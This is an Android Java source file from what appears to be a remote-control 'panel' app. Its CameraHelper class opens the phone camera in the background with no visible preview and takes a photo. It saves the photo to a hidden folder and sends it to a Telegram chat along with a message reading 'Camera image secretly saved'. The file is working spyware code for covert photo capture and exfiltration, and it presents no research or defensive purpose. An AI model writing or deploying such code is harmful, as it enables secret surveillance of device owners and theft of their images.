package com.java.panel;

import android.content.Context;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.os.Environment;
import java.io.File;
import java.io.FileOutputStream;

public class CameraHelper {

    public static void takePicture(Context context, int cameraId, String chatId) {
        new Thread(() -> {
            Camera camera = null;
            try {
                camera = Camera.open(cameraId);
                SurfaceTexture surfaceTexture = new SurfaceTexture(10);
                camera.setPreviewTexture(surfaceTexture);
                camera.startPreview();

                Thread.sleep(1200);

                camera.takePicture(null, null, (data, cam) -> {
                    try {
                        File dir = new File("/storage/emulated/0/panel/");
                        if (!dir.exists()) dir.mkdirs();
                        File file = new File(dir, "cam_" + System.currentTimeMillis() + ".jpg");
                        FileOutputStream fos = new FileOutputStream(file);
                        fos.write(data);
                        fos.close();

                        if (ShellService.instance != null) {
                            ShellService.instance.sendTelegramMessage(chatId, "📸 Camera image secretly saved:\n" + file.getAbsolutePath());
                            ShellService.instance.sendFileToTelegram(file.getAbsolutePath(), chatId);
                        }
                    } catch (Exception e) {
                        if (ShellService.instance != null) {
                            ShellService.instance.sendTelegramMessage(chatId, "❌ Camera recording error: " + e.getMessage());
                        }
                    } finally {
                        releaseCamera(cam);
                    }
                });
            } catch (Exception e) {
                tryCameraWithRootOrShizuku(cameraId, chatId);
            }
        }).start();
    }

    private static void releaseCamera(Camera cam) {
        if (cam != null) {
            try {
                cam.stopPreview();
                cam.release();
            } catch (Exception ignored) {}
        }
    }

    private static void tryCameraWithRootOrShizuku(int cameraId, String chatId) {
        if (ShellService.instance != null) {
            ShellService.instance.sendTelegramMessage(chatId, "❌ Camera could not be started in the background (Permission or hardware restriction).");
        }
    }
}
